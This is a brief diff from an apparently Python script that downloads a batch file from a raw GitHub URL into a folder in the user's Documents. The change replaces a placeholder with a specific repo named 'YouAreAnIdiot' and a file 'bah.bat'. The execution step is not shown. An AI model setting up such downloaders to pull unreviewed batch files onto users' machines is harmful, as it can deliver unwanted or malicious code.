@@ -18,7 +18,7 @@ import platform
 # Replace this with the *raw* GitHub URL to your message.bat file.
 # Example raw URL format:
 # https://raw.githubusercontent.com/<username>/<repo>/main/message.bat
-RAW_BAT_URL = "https://raw.githubusercontent.com/<your-username>/<your-repo>/main/message.bat"
+RAW_BAT_URL = "https://raw.githubusercontent.com/<iamarealsealbutnice-ops>/<YouAreAnIdiot>/main/bah.bat"
 
 # Folder name inside Documents where the bat will be saved
 DEST_FOLDER_NAME = "DownloadedBat"
